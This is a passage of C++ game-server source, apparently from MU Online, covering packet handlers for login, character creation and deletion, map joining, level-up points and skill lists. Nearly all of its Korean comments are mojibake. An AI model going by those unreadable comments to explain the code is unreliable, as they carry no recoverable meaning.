	BuxConvert(szId, MAX_IDSTRING);
	BuxConvert(szPass, MAX_IDSTRING);

	memcpy(spMsg.Id,   szId,   MAX_IDSTRING);
	memcpy(spMsg.Pass, szPass, MAX_IDSTRING);
	
	logincounttest++;
	if( GetTickCount()-ltesttime > 1000 )
	{
		ltesttime = GetTickCount();
		logincounttest = 0;

	}

	//strcpy(spMsg.IpAddress, gObj[aIndex].sb.Ip_addr);
	
	//gObj[aIndex].CheckTick			= lpMsg->TickCount;
	//gObj[aIndex].CheckTick2			= GetTickCount();
	//gObj[aIndex].ConnectCheckTime	= GetTickCount();
	//gObj[aIndex].CheckSpeedHack		= 1;
	
	// ���Ӽ������� ����� ������ �����Ѵ�.
	wsJServerCli.DataSend((char*)&spMsg, spMsg.h.size);

	spMsg.h.headcode = 0x01;
	wsJServerCli.DataSend((char*)&spMsg, spMsg.h.size);
}

//----------------------------------------------------------------------------
// [0x06] ���������� ���� �ð� Ȯ�� ��û
//----------------------------------------------------------------------------
void GCJoinBillCheckSend(char *AccountId, int aIndex)
{
	SDHP_BILLSEARCH	pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x06, sizeof( pMsg ));

	memcpy(pMsg.Id, AccountId, MAX_IDSTRING);
	pMsg.Number = aIndex;

	wsJServerCli.DataSend((char*)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0xF1][0x01] 
//----------------------------------------------------------------------------
void GCJoinResult(BYTE result, int aIndex)
{
	PMSG_RESULT			pResult;
		
	PHeadSubSetB((LPBYTE)&pResult, 0xF1, 0x01, sizeof( pResult ) );
	pResult.result	   = result;
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}

//----------------------------------------------------------------------------
// [0xF1][0x01] 
//----------------------------------------------------------------------------
void GCJoinSocketResult(BYTE result, SOCKET Socket)
{
	PMSG_RESULT			pResult;
		
	PHeadSubSetB((LPBYTE)&pResult, 0xF1, 0x01, sizeof( pResult ) );

	pResult.result	   = result;
	wsGServer.DataSocketSend(Socket, (char*)&pResult, pResult.h.size);
}

//----------------------------------------------------------------------------
// [0xF1][0x02] Ŭ���̾�Ʈ ���� �޽����� �޾� ó���Ѵ�.
//----------------------------------------------------------------------------
void CGClientCloseMsg(LPPMSG_CLIENTCLOSE lpMsg, int aIndex)
{
	switch( lpMsg->Flag )
	{
	case 0x00 :	// 5�ʵ� ���� ����
		gObjCloseSet(aIndex, CL_EXIT);		

#ifdef MODIFY_CONNNECT_HACK_ATTACK_20090409
		if( aIndex < 0 || aIndex > MAX_OBJECT-1 ) return ;
		LogAddTD_TempLog(", [UserSelClose] Go Exit, Account [%s], IP [%s], Name [%s], Map:[%d][%d/%d]",
			gObj[aIndex].AccountID, gObj[aIndex].Ip_addr, gObj[aIndex].Name,
			gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
#endif

#ifdef ADD_LOG_USER_CLOSE_SET
		if( aIndex < 0 || aIndex > MAX_OBJECT-1 ) return ;
		LogAddTD("[UserSelClose] Go Exit [%s][%s] Map:[%d][%d/%d]", 
				 gObj[aIndex].AccountID, gObj[aIndex].Name,
				 gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
#endif
		break;	
	case 0x02 :	// ���� ��������
		gObjCloseSet(aIndex, CL_SERVERLIST);

#ifdef MODIFY_CONNNECT_HACK_ATTACK_20090409
		if( aIndex < 0 || aIndex > MAX_OBJECT-1 ) 
			return ;
		
		LogAddTD_TempLog(", [UserSelClose] Go ServerList, Account [%s], IP [%s], Name [%s], Map:[%d][%d/%d]", 
			gObj[aIndex].AccountID, gObj[aIndex].Ip_addr, gObj[aIndex].Name,
			gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
#endif

#ifdef ADD_LOG_USER_CLOSE_SET
		if( aIndex < 0 || aIndex > MAX_OBJECT-1 ) return ;

		LogAddTD("[UserSelClose] Go ServerList [%s][%s] Map:[%d][%d/%d]", 
				 gObj[aIndex].AccountID, gObj[aIndex].Name,
				 gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
#endif
		break;	
	case 0x01 :	// ���� �޴��� �̵�..
		gObjCloseSet(aIndex, CL_BACK);

#ifdef MODIFY_CONNNECT_HACK_ATTACK_20090409
		if( aIndex < 0 || aIndex > MAX_OBJECT-1 ) return ;
		LogAddTD_TempLog(", [UserSelClose] Go CharSelect, Account [%s], IP [%s], Name [%s], Map:[%d][%d/%d]", 
			gObj[aIndex].AccountID, gObj[aIndex].Ip_addr, gObj[aIndex].Name,
			gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
#endif


#ifdef ADD_LOG_USER_CLOSE_SET
		if( aIndex < 0 || aIndex > MAX_OBJECT-1 ) return ;
		LogAddTD("[UserSelClose] Go CharSelect [%s][%s] Map:[%d][%d/%d]", 
				 gObj[aIndex].AccountID, gObj[aIndex].Name,
				 gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y);
#endif
		break;
	}
}

//----------------------------------------------------------------------------
// [0xF1][0x02] Ŭ���̾�Ʈ�� ���� �޽����� ������.
//0x00 : ���α׷��� �����Ͻÿ�
//0x01 : �����޴� ȭ���� ���ÿ�
//0x02 : ĳ���� ����ȭ������ ���ÿ�
//----------------------------------------------------------------------------
void GCCloseMsgSend(int aIndex, BYTE result)
{
	PMSG_RESULT			pMsg;
	
	PHeadSubSetBE((LPBYTE)&pMsg, 0xF1, 0x02, sizeof( pMsg ) );
	pMsg.result			= result;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0xF1][0x03] Ŭ���̾�Ʈ�� ������ �ش� �ڵ带 ������
//----------------------------------------------------------------------------
void CGClientMsg(LPPMSG_CLIENTMSG lpMsg, int aIndex)
{	
	if(gObj[aIndex].m_bShell == true)
		return;

#ifdef CHANGE_CLIENTHACKCHECK_MSG	
	if( lpMsg->Flag != 0x00 )
	{
		LogAddC(LOGC_RED, "error-L1 : HackCheck [%s][%s] 0x%x 0x%x", 
				gObj[aIndex].AccountID, 
				gObj[aIndex].Name, 
				lpMsg->Flag,
				lpMsg->subFlag);
	}
	else
	{		
		if( (gObj[aIndex].m_ClientHackLogCount < 100 ) )
		{
			LogAddC(LOGC_RED, "error-L1 : HackCheck [%s][%s] 0x%x 0x%x", 
					gObj[aIndex].AccountID, 
					gObj[aIndex].Name, 
					lpMsg->Flag,
					lpMsg->subFlag);
		}

		gObj[aIndex].m_ClientHackLogCount++;
		if( gObj[aIndex].m_ClientHackLogCount >= 100 )
		{
			gObj[aIndex].m_ClientHackLogCount = 100;
		}
	}	
#else
	LogAddC(LOGC_RED, "error-L1 : HackCheck [%s][%s] 0x%x", gObj[aIndex].AccountID, gObj[aIndex].Name, lpMsg->Flag);
#endif
#ifdef HACK_LOG	
	char msg[255];
	wsprintf(msg, "Client HackCheck %u", (DWORD)lpMsg->Flag);
	gSendHackLog.Send(aIndex, 0, msg);
#endif

	if( lpMsg->Flag == 0x00 )
	{
		//gObjCloseSet(aIndex, CL_EXIT);	
	}
}


//----------------------------------------------------------------------------
// [0xF3][0x01]
// �����κ��� ĳ���� ����� ��û�� ������
//----------------------------------------------------------------------------
void CGPCharacterCreate(LPPMSG_CHARCREATE lpMsg, int aIndex)
{	
	SDHP_CREATECHAR		sCreate;
	
	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) 
	{
		JGCharacterCreateFailSend(aIndex, lpMsg->Name);
		return;
	}

	// ������ �ȹ��� ���¶�� �����Ų��.
	if( gObj[aIndex].Connected < 2 ) 
	{
		//wsGServer.Close(gObj[aIndex].m_socket);
		LogAdd(lMsg.Get(476), aIndex, gObj[aIndex].Ip_addr);
		CloseClient ( aIndex );
		return;
	}
	

#ifdef MODIFY_CHARACTER_DELETE_IN_MAP_20051121
	if( gObj[aIndex].Connected == CSS_GAMEPLAYING )
	{
		LogAddTD( "[Anti-HACK][CGPCharacterCreate] Attempted Character Create during GamePlay. [%s][%s]",
			gObj[aIndex].AccountID, gObj[aIndex].Name );
		CloseClient ( aIndex );
		return;
	}

#endif
	
	// ĳ���͸� �����Ҽ� ��������..
	if( !gCreateCharacter )
	{
		GCServerMsgStringSend("�������� �Ⱓ���� ĳ���͸� �����Ҽ� �����ϴ�", aIndex, 1);	
		JGCharacterCreateFailSend(aIndex, lpMsg->Name);
		return;
	}

	// Ȥ�� ĳ���� ���� �ٸ��� ���Դٸ�.
	if( lpMsg->ClassSkin == 0 ||
		lpMsg->ClassSkin == 16 ||
		lpMsg->ClassSkin == 32 ||
		lpMsg->ClassSkin == 48 
#ifdef DARKLORD_WORK
		|| lpMsg->ClassSkin == 64 
#endif
#ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912
		|| lpMsg->ClassSkin == 80	// ��ȯ����
#endif
		)
	{
		// �˷��� ĳ�����̴�.
	}
	else 
	{
		JGCharacterCreateFailSend(aIndex, lpMsg->Name);
		return;
	}

#ifdef ADD_CHARCARD_SUMMONER_20080313
	if (lpMsg->ClassSkin == 80 && gObj[aIndex].m_bCharCardSummoner != TRUE) 
	{
		JGCharacterCreateFailSend(aIndex, lpMsg->Name);
		return;
	}
#endif // ADD_CHARCARD_SUMMONER_20080313

	// ���˻� ���� �϶��� ����� �ִ� �������� Ȯ���� ����.
	if( lpMsg->ClassSkin == 48 )
	{
		if( gObj[aIndex].Magumsa == 0 ) 
		{
			LogAddC(LOGC_RED,"error-L1: Magumsa Character create error [%s]", gObj[aIndex].AccountID);
			JGCharacterCreateFailSend(aIndex, lpMsg->Name);
			return;
		}
	}
	
	if( lpMsg->ClassSkin == 64 )
	{
		if( gObj[aIndex].Magumsa != 2 ) 
		{
			LogAddC(LOGC_RED,"error-L1: Darklord Character create error [%s]", gObj[aIndex].AccountID);
			JGCharacterCreateFailSend(aIndex, lpMsg->Name);
			return;
		}
	}
	
	memset(&sCreate, 0, sizeof(sCreate));
	
	PHeadSetB((LPBYTE)&sCreate, 0x04, sizeof( sCreate ));

	sCreate.ClassSkin  = lpMsg->ClassSkin;
	sCreate.Number     = aIndex;
	
	memcpy(sCreate.AccountId, gObj[aIndex].AccountID, MAX_IDSTRING);
	memcpy(sCreate.Name, lpMsg->Name, MAX_IDSTRING);
	
#if _DEBUG
	char szTmpID[MAX_IDSTRING+1];
	szTmpID[MAX_IDSTRING] = '\0';
	memcpy(szTmpID, lpMsg->Name, MAX_IDSTRING);
	LogAdd("Create Character: %s %s", gObj[aIndex].AccountID, szTmpID);
#endif
		
	// ������ ĳ���� ���� ��û�� �Ѵ�.
	char szTemp[20], szTemp2[20];
	szTemp[MAX_IDSTRING] = '\0';
	szTemp2[MAX_IDSTRING] = '\0';
	memcpy(szTemp, sCreate.Name, MAX_IDSTRING);
	memcpy(szTemp2, sCreate.AccountId, MAX_IDSTRING);
	LogAddTD("Character create : %s,%s", szTemp2, szTemp);
	//wsDataCli.DataSend((char*)&sCreate, sCreate.h.size);
	cDBSMng.Send((char*)&sCreate, sCreate.h.size);
}

//----------------------------------------------------------------------------
// [0xF3][0x02]
// �����κ��� ĳ���� ���� ��û�� ������
//----------------------------------------------------------------------------
void CGPCharDel(LPPMSG_CHARDELETE lpMsg, int aIndex)
{
	SDHP_CHARDELETE	pCDel;
	PMSG_RESULT		pResult;

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	// ������ �ȹ��� ���¶�� �����Ų��.
	if( gObj[aIndex].Connected < 2 ) 
	{
		CloseClient ( aIndex );
		return;
	}
	
#ifdef MODIFY_CHARACTER_DELETE_IN_MAP_20051121
	if( gObj[aIndex].Connected == CSS_GAMEPLAYING )
	{
		LogAddTD( "[Anti-HACK][CGPCharDel] Attempted Character Delete during GamePlay. [%s][%s]",
			gObj[aIndex].AccountID, gObj[aIndex].Name );
		CloseClient ( aIndex );
		return;
	}

#endif
	
#ifdef BLOCK_INVALID_CHARACTER_DELETE_01_20060327
	if( gObj[aIndex].bEnableDelCharacter == FALSE )
	{
		LogAddTD( "[Anti-HACK][CGPCharDel] Attempted Character Delete during Prevented Time. [%s][%s]",
			gObj[aIndex].AccountID, gObj[aIndex].Name );
		CloseClient ( aIndex );
		return;
	}
#endif

	PHeadSubSetB((LPBYTE)&pResult, 0xF3, 0x02, sizeof( pResult ) );
	pResult.result	   = 0x00;

	if( gObj[aIndex].m_cAccountItemBlock )
	{	// �����ۺ��϶��� ĳ���͸� ���� �Ҽ� ����
		pResult.result	   = 0x03;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( gGuildDestroy == 0 )
	{
		pResult.result	   = 0x00;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}


////////////////////////////////////////////////////////////////////////
// DEL_CODE_LIMIT_OF_DEL_CHARACTER_LEVEL_20050215
//
// �߸��� �ڵ�. : ĳ�� ���ý� ������ �˼� ����
// �ּ� ���� ���� ũ�ٸ� ������ ������.
//	if( gObj[aIndex].Level >= gCharacterDeleteMinLevel )
//	{
//		pResult.result	   = 0x00;
//		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
//		return;
// 	}
////////////////////////////////////////////////////////////////////////



	// �ֹε�� �޹�ȣ�� Ȯ���� ���� Ʋ����.
#ifdef UPDATE_USERPASSWORD_LENGTH_20090424	
	char szJoomin[MAX_JOOMINNUMBER_LENGTH+1];
	
	
	memset( szJoomin, 0 , MAX_JOOMINNUMBER_LENGTH+1);
	memcpy( szJoomin, lpMsg->LastJoominNumber, MAX_JOOMINNUMBER_LENGTH);
	
	if( gObjJoominCheck(aIndex, szJoomin) == FALSE )
	{
		pResult.result	   = 0x02;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#else	// UPDATE_USERPASSWORD_LENGTH_20090424
	char szJoomin[11];


	memset( szJoomin, 0 , 11);
	memcpy( szJoomin, lpMsg->LastJoominNumber, 10);
	
	if( gObjJoominCheck(aIndex, szJoomin) == FALSE )
	//if( strcmp(lpMsg->LastJoominNumber, gObj[aIndex].LastJoominNumber) != 0 )
	{
		pResult.result	   = 0x02;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif	// UPDATE_USERPASSWORD_LENGTH_20090424

	PHeadSetB((LPBYTE)&pCDel, 0x05, sizeof( pCDel ));

	pCDel.Number     = aIndex;
	memcpy(pCDel.AccountID, gObj[aIndex].AccountID, MAX_IDSTRING);
	memcpy(pCDel.Name, lpMsg->Name, MAX_IDSTRING);
	pCDel.Guild		 = 0;
	if( gObj[aIndex].GuildNumber > 0 )
	{
		if( gObj[aIndex].lpGuild != NULL )
		{
			if( strcmp(gObj[aIndex].Name, gObj[aIndex].lpGuild->Names[0]) == 0 )	// �渶�϶�.. ������������.
			{
				pCDel.Guild = 1;	// �渶�϶� ��� ������ �˸���.
			}			
			else pCDel.Guild = 2;	// �����϶� ��忡�� ��� ����
			memcpy(pCDel.GuildName, gObj[aIndex].lpGuild->Name,MAX_GUILDNAMESTRING);
		}
	}

#ifdef MODIFY_PERIOD_ITEM_SYSTEM_BUGFIX_20070326
	g_CashItemPeriodSystem.GDReqPeriodItemDelete( &gObj[aIndex], lpMsg->Name );
#endif // MODIFY_PERIOD_ITEM_SYSTEM_BUGFIX_20070326

	char szTemp[20], szTemp2[20];
	szTemp[MAX_IDSTRING] = '\0';
	szTemp2[MAX_IDSTRING] = '\0';
	memcpy(szTemp, pCDel.Name, MAX_IDSTRING);
	memcpy(szTemp2, pCDel.AccountID, MAX_IDSTRING);
	
	LogAddTD("Character delete : %s,%s", szTemp2, szTemp);
	//wsDataCli.DataSend((char*)&pCDel, pCDel.h.size);
	cDBSMng.Send((char*)&pCDel, pCDel.h.size);

#ifdef MODIFY_MATCHDB_UPDATE_DELETED_CHARACTER_20060810
	// �ش� ĳ���Ͱ� �����Ǿ��ٴ� ���� Ȯ���ϱ� ���� ������ 0���� �����Ѵ�.
	gObj[aIndex].Level = 0;
#endif
	
#ifdef NOTIFY_CHARACTER_DELETE_FROM_GS_TO_JS_20060322
	// ĳ���� ���� �� ���� ������ �˸���.
	// DataServer ���� 0x05 ��������
	// JoinServer ���� 0x15 �������� 
	pCDel.h.headcode = 0x15;
	wsJServerCli.DataSend((char*)&pCDel, pCDel.h.size);
#endif
	
}

//----------------------------------------------------------------------------
// [0xF3][0x03]
// ������ ĳ���ͷ� �� ���� ��û�� ���� ���������� ���� ĳ���� ������ �޾ƿ´�.
//----------------------------------------------------------------------------
void CGPCharacterMapJoinRequest(LPPMSG_CHARMAPJOIN lpMsg, int aIndex)
{
	char _name[MAX_IDSTRING+1];

	// �� ���Խ� ĳ���� ������ ��û�ϴ��� Ȯ���ϱ����� �ӽ� �α�
#ifdef MODIFY_CASTLE_MAP_MOVE_TRACE_LOG_20080418
	LogAddTD( "[BUGTRACE][CGPCharacterMapJoinRequest] (%d) ID : %s, Name : %s(%s), MapMove : %d, MapIndex : %d, ConnectState : %d",
		aIndex, gObj[aIndex].AccountID, gObj[aIndex].Name, lpMsg->Name, gObj[aIndex].m_bMapSvrMoveReq, gObj[aIndex].MapNumber, gObj[aIndex].Connected );
#endif // MODIFY_CASTLE_MAP_MOVE_TRACE_LOG_20080418	

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;
	if( gObjIsAccontConnect(aIndex,gObj[aIndex].AccountID)  == FALSE ) return;
	if( gObj[aIndex].Connected == CSS_GAMEPLAYING )	//
	{
		return;
	}

#ifdef UPDATE_RESEND_GETCHARlIST_DISABLE_20090605
	if( gObj[aIndex].m_bRequestPaket == TRUE )
	{
		//LogAdd("ReSend CharacterList (%s)", gObj[aIndex].Name);
		gObj[aIndex].m_nRequestPacketCnt++;
		if(gObj[aIndex].m_nRequestPacketCnt > 7)
		{
			// ���������� �����Ǹ� ���
			//GJRequestBlockIp(gObj[aIndex].Ip_addr);
			
			// ����� ����
			LogAdd("ReSend JoinMap CloseUser (%s)", gObj[aIndex].Name);
			CloseClient ( aIndex );
			return;
		}
	}
	
	gObj[aIndex].m_bRequestPaket = TRUE;
#endif	// UPDATE_RESEND_GETCHARlIST_DISABLE_20090605
	
#ifdef BLOCK_INVALID_CHARACTER_DELETE_01_20060327
	gObj[aIndex].bEnableDelCharacter = FALSE;
#endif

	SDHP_DBCHARINFOREQUEST	pCRequest;

	PHeadSetB((LPBYTE)&pCRequest, 0x06, sizeof( pCRequest ));
	
	memset(_name, 0, MAX_IDSTRING);
	memcpy(_name, lpMsg->Name, MAX_IDSTRING);
	BuxConvert(_name, MAX_IDSTRING);
	memcpy(pCRequest.Name, _name, MAX_IDSTRING);
	strcpy(pCRequest.AccountID, gObj[aIndex].AccountID);


#ifdef MODIFY_CASTLE_MAP_MOVE_TRACE_LOG_20080418
	LogAddTD( "[BUGTRACE][CGPCharacterMapJoinRequest] (%d) ID : %s, Name : %s(%s) Send Request",
		aIndex, gObj[aIndex].AccountID, gObj[aIndex].Name, lpMsg->Name );
#endif // MODIFY_CASTLE_MAP_MOVE_TRACE_LOG_20080418
	
	pCRequest.Number = aIndex;	
	//wsDataCli.DataSend((char*)&pCRequest, pCRequest.h.size);

#ifdef MODIFY_CONNNECT_HACK_ATTACK_20090409
	// ĳ���� ���� ĳ���� ���� ��û
	LogAddTD_TempLog(", [G->D Req MapJoin] CharSelected, Account [%s], IP [%s], Name[%s](%s)", 
		gObj[aIndex].AccountID, gObj[aIndex].Ip_addr, gObj[aIndex].Name, lpMsg->Name);
#endif

	cDBSMng.Send((char*)&pCRequest, pCRequest.h.size);
}

//----------------------------------------------------------------------------
// [0xF3][0x05] ������ �� �Ǿ��ٰ� �˸���.

#ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
// ������ �Ӹ� �ƴ϶� ���� ���� �� ���� ���� ���� ������ ������.
void GCLevelUpMsgSend( int aIndex, int iSendEffect )
{
	if( !CHECK_LIMIT( aIndex, MAX_OBJECT ) )
		return;

	short AddPoint		= 0;
	short MaxAddPoint	= 0;
	short MinusPoint	= 0;
	short MaxMinusPoint = 0;

	gObjGetStatPointState(gObj[aIndex].m_Index, AddPoint, MaxAddPoint, MinusPoint, MaxMinusPoint);
	
	PMSG_LEVELUP pMsg;
	
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x05, sizeof( pMsg ) );

	pMsg.Level			= gObj[aIndex].Level;
	pMsg.LevelUpPoint	= gObj[aIndex].LevelUpPoint;
	pMsg.MaxLife        = (WORD)(gObj[aIndex].MaxLife+gObj[aIndex].AddLife);
	pMsg.MaxMana        = (WORD)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana);
	pMsg.MaxBP			= (WORD)(gObj[aIndex].MaxBP  +gObj[aIndex].AddBP);

#ifdef ADD_SHIELD_POINT_01_20060403
	pMsg.wMaxShield		= (WORD)(gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield);
#endif
	
	pMsg.AddPoint		= AddPoint;						// ���� ���� ����Ʈ
	pMsg.MaxAddPoint	= MaxAddPoint;					// �ִ� ���� ����Ʈ
	
	pMsg.MinusPoint		= MinusPoint;					// ���� ���� ����Ʈ
	pMsg.MaxMinusPoint	= MaxMinusPoint;				// �ִ� ���� ����Ʈ
	

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	
	if( iSendEffect == 1 )
		GCSendEffectInfo( aIndex, EFFECT_LEVELUP );
}

#else

	void GCLevelUpMsgSend(int aIndex, WORD Level, WORD LevelUpPoint, WORD MaxLife, WORD MaxMana, WORD MaxBP, short AddPoint, short MaxAddPoint)
	{
		PMSG_LEVELUP pMsg;
		
		PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x05, sizeof( pMsg ) );
		pMsg.Level			= Level;
		pMsg.LevelUpPoint	= LevelUpPoint;
		pMsg.MaxLife        = MaxLife;
		pMsg.MaxMana        = MaxMana;
		pMsg.MaxBP			= MaxBP;
		pMsg.AddPoint		= AddPoint;
		pMsg.MaxAddPoint	= MaxAddPoint;
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	#ifdef ADD_EFFECT_LEVELUP_20040401
		GCSendEffectInfo( aIndex, EFFECT_LEVELUP );
	#endif
	}

#endif



// [0xF3][0x06] ������ ����Ʈ�� ��������.
void CGLevelUpPointAdd(LPPMSG_LVPOINTADD lpMsg, int aIndex)
{
	// ������ �ȹ��� ���¶�� �����Ų��.
	if( gObjIsConnected(aIndex) == FALSE )
	{
		CloseClient ( aIndex );
		return;
	}

	PMSG_LVPOINTADDRESULT	pMsg;
		
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x06, sizeof( pMsg ) );

	pMsg.ResultType	= 0;
	if( gObjLevelUpPointAdd(lpMsg->Type, &gObj[aIndex])==TRUE)
	{
		pMsg.ResultType	= (0x01<<4);
		pMsg.ResultType += lpMsg->Type;
		switch( lpMsg->Type )
		{
		case 2 : // ü�� 
			pMsg.MaxLifeAndMana = (WORD)(gObj[aIndex].MaxLife+gObj[aIndex].AddLife);
			break;
		case 3 : // ������
#ifdef MODIFY_SHIELD_MANA_CHANGEMAXVALUE_20060526
			pMsg.MaxLifeAndMana = (WORD)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana);
#else
			pMsg.MaxLifeAndMana = (WORD)(gObj[aIndex].MaxMana);
#endif // MODIFY_SHIELD_MANA_CHANGEMAXVALUE_20060526
			break;
		}

#ifdef AUTH_GAMESERVER_CHECKKEY
	if( szAuthKey[9] != AUTH_CHECK_09 )
		DestroyGIocp();
#endif

#ifdef ADD_SHIELD_POINT_01_20060403
	pMsg.wMaxShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
#endif

#ifdef NEW_FORSKYLAND2
		gObjSetBP(aIndex);
		pMsg.MaxBP = gObj[aIndex].MaxBP+gObj[aIndex].AddBP;
#endif
	}
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// [0xF3][0x14] �κ��丮 �������� ������.
void GCInventoryItemOneSend(int aIndex, int pos)
{
	PMSG_INVENTORYITEMMODIFY	pMsg;

	if( gObj[aIndex].pInventory[pos].IsItem() == FALSE ) return;

	
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x14, sizeof( pMsg ) );
	pMsg.Pos			= pos;
	ItemByteConvert(pMsg.ItemInfo, gObj[aIndex].pInventory[pos] );
		
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


void GCPkLevelSend(int aIndex, BYTE pklevel)
{
	PMSG_PKLEVEL	pMsg;
		
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x08, sizeof( pMsg ) );

	pMsg.NumberH	= HIBYTE(aIndex);
	pMsg.NumberL	= LOBYTE(aIndex);
	pMsg.PkLevel	= pklevel;
	
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	MsgSendV2(&gObj[aIndex], (LPBYTE)&pMsg, pMsg.h.size);
}

// [0xF3][0x11] ���� ����Ʈ�� �����µ�.. �ϳ��� �����°�
#ifdef MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807	// type�� BYTE ���� WORD�� ����
void GCMagicListOneSend(int aIndex, char Pos, WORD type, BYTE level, BYTE skill, BYTE btListType )
#else	// MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807
#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
void GCMagicListOneSend(int aIndex, char Pos, BYTE type, BYTE level, BYTE skill, BYTE btListType )
#else
void GCMagicListOneSend(int aIndex, char Pos, BYTE type, BYTE level, BYTE skill )
#endif
#endif	// MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807
{
	PMSG_MAGICLISTCOUNT	pCount;
	PMSG_MAGICLIST		pList;

#ifdef EXPAND_MAX_MAGICLIST_20_TO_60_20041126
	char sendbuf[1000];
#else
	char sendbuf[256];
#endif
	
	int  lOfs=sizeof(pCount);

	
	PHeadSubSetB((LPBYTE)&pCount, 0xF3, 0x11, 0);

	pCount.Count        = 0xFE;

#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
	pCount.btListType	= btListType;
#endif
	
	pList.Pos           = Pos;
#ifdef MASTER_LEVEL_SKILL_SYSTEM_20071122	// PMSG_MAGICLIST ��Ŷ���� ó��
	pList.wSkillNum		= type;
	pList.btSkillLevel  = (level<<3);
	pList.btSkillLevel  |= (skill&0x07);
#else
	pList.MagicInfo[0]  = type;
	pList.MagicInfo[1]  = (level<<3);
	pList.MagicInfo[1]  |= (skill&0x07);
#endif
	
	memcpy(sendbuf+lOfs, &pList, sizeof(pList));
	lOfs += sizeof( pList );

	pCount.h.size = lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));

	DataSend(aIndex, (LPBYTE)sendbuf, lOfs);
}

// [0xF3][0x11] ��������Ʈ ���� ���� �ϳ��� �����°�
#ifdef MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807	// type�� BYTE ���� WORD�� ����
void GCMagicListOneDelSend(int aIndex, char Pos, WORD type, BYTE level, BYTE skill, BYTE btListType )
#else	// MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807
#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
void GCMagicListOneDelSend(int aIndex, char Pos, BYTE type, BYTE level, BYTE skill, BYTE btListType )
#else
void GCMagicListOneDelSend(int aIndex, char Pos, BYTE type, BYTE level, BYTE skill )
#endif
#endif	// MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807
{
	PMSG_MAGICLISTCOUNT	pCount;
	PMSG_MAGICLIST		pList;

#ifdef EXPAND_MAX_MAGICLIST_20_TO_60_20041126
	char sendbuf[1000];
#else
	char sendbuf[256];
#endif

	int  lOfs=sizeof(pCount);
	
	PHeadSubSetB((LPBYTE)&pCount, 0xF3, 0x11, 0 );
	pCount.h.size		= 0;
	pCount.Count        = 0xFF;	// ī��Ʈ�� 0xFF �̸� ������ �˸���.
	
#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
	pCount.btListType	= btListType;
#endif

	pList.Pos           = Pos;
#ifdef MASTER_LEVEL_SKILL_SYSTEM_20071122	// PMSG_MAGICLIST ��Ŷ���� ó��
	pList.wSkillNum		= type;
	pList.btSkillLevel  = (level<<3);
	pList.btSkillLevel  |= (skill&0x07);
#else
	pList.MagicInfo[0]  = type;
	pList.MagicInfo[1]  = (level<<3);
	pList.MagicInfo[1]  |= (skill&0x07);
#endif
	
	memcpy(sendbuf+lOfs, &pList, sizeof(pList));
	lOfs += sizeof( pList );

	pCount.h.size = lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));

	DataSend(aIndex, (LPBYTE)sendbuf, lOfs);
}

// [0xF3][0x11] ���� ����Ʈ�� �����µ�.. �� ������ ��� ������ ��� ������.
#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
void GCMagicListMultiSend( LPOBJECTSTRUCT lpObj, BYTE btListType )
#else
void GCMagicListMultiSend( LPOBJECTSTRUCT lpObj )
#endif
{
	PMSG_MAGICLISTCOUNT	pCount;
	PMSG_MAGICLIST		pList;
	
#ifdef EXPAND_MAX_MAGICLIST_20_TO_60_20041126
	char sendbuf[1000];
#else
	char sendbuf[256];
#endif
	int  lOfs=sizeof(pCount);
	int	 Count=0;

#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
	pCount.btListType	= btListType;
#endif
	
	PHeadSubSetB((LPBYTE)&pCount, 0xF3, 0x11, 0);
	
	for( int n=0; n<MAX_MAGIC; n++)
	{
		if( lpObj->Magic[n].IsMagic() == TRUE )
		{
